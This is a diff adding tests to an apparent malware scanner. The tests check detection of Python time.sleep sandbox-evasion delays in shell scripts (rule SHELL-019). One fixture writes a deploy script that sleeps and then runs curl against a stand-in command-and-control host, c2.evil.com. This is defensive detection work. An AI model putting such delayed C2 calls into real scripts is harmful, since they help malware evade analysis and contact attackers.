@@ -253,6 +253,74 @@ async function runShellTests() {
       assert(t, 'bun run in shebang file should be detected');
     } finally { cleanupTemp(tmp); }
   });
+
+  // --- v2.10.7: Python time.sleep sandbox evasion (SHELL-019) ---
+
+  await asyncTest('SHELL-019: python3 -c time.sleep(300) in .sh → python_time_delay_exec', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'deploy.sh'), '#!/bin/bash\npython3 -c "import time; time.sleep(300); import os; os.system(\'curl http://c2.evil.com\')"');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = (result.threats || []).find(t => t.type === 'python_time_delay_exec');
+      assert(t, 'python3 -c with time.sleep(300) should be detected');
+      assert(t.severity === 'HIGH', `Expected HIGH, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('SHELL-019: python -c time.sleep(600) in .sh file → python_time_delay_exec', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'setup.sh'), '#!/bin/bash\npython -c "import time; time.sleep(600)"');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = (result.threats || []).find(t => t.type === 'python_time_delay_exec');
+      assert(t, 'python -c with time.sleep(600) in .sh should be detected');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('SHELL-019: python3 time.sleep(5) in .sh → NOT detected (< 100s)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'run.sh'), '#!/bin/bash\npython3 -c "import time; time.sleep(5)"');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = (result.threats || []).find(t => t.type === 'python_time_delay_exec');
+      assert(!t, 'time.sleep(5) should NOT trigger python_time_delay_exec (< 100s)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('SHELL-019: python3 time.sleep(99) in .sh → NOT detected (< 100s)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'check.sh'), '#!/bin/bash\npython3 -c "import time; time.sleep(99)"');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = (result.threats || []).find(t => t.type === 'python_time_delay_exec');
+      assert(!t, 'time.sleep(99) should NOT trigger python_time_delay_exec (< 100s)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('SHELL-019: python3 time.sleep(100) in .sh → detected (exactly 100s)', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shell-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-shell', version: '1.0.0' }));
+    fs.writeFileSync(path.join(tmp, 'init.sh'), '#!/bin/bash\npython3 -c "import time; time.sleep(100)"');
+    try {
+      const result = await runScanDirect(tmp);
+      const t = (result.threats || []).find(t => t.type === 'python_time_delay_exec');
+      assert(t, 'time.sleep(100) should trigger python_time_delay_exec (>= 100s)');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('SHELL-019: rule and playbook exist for python_time_delay_exec', async () => {
+    const { getRule } = require('../../src/rules/index.js');
+    const { getPlaybook } = require('../../src/response/playbooks.js');
+    const rule = getRule('python_time_delay_exec');
+    assert(rule.id === 'MUADDIB-SHELL-019', `Expected MUADDIB-SHELL-019, got ${rule.id}`);
+    assert(rule.mitre === 'T1497.003', `Expected T1497.003, got ${rule.mitre}`);
+    const playbook = getPlaybook('python_time_delay_exec');
+    assert(playbook.includes('T1497.003'), 'Playbook should reference T1497.003');
+  });
 }
 
 module.exports = { runShellTests };
